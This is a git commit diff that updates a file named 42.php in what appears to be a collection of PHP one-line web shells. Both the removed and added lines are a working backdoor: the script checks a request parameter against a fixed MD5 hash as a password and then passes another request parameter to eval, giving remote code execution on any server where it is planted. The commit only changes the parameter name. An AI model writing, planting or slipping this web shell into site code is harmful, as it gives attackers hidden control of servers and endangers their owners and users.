4370c67a5902bb3c0cbdda73818fd7a68c7ea3fa
0xFlag <54313514+0xFlag@users.noreply.github.com>
2020-08-16 13:08:28 +0800

    Update 42.php

--- yjh/php/42.php
+++ yjh/php/42.php
@@ -1,1 +1,1 @@
-<?php $s=@$_GET[a];if(md5($s)=="2591c98b70119fe624898b1e424b5e91"){@eval($_REQUEST[$s]);}?>
+<?php $s=@$_GET[id];if(md5($s)=="2591c98b70119fe624898b1e424b5e91"){@eval($_REQUEST[$s]);}?>
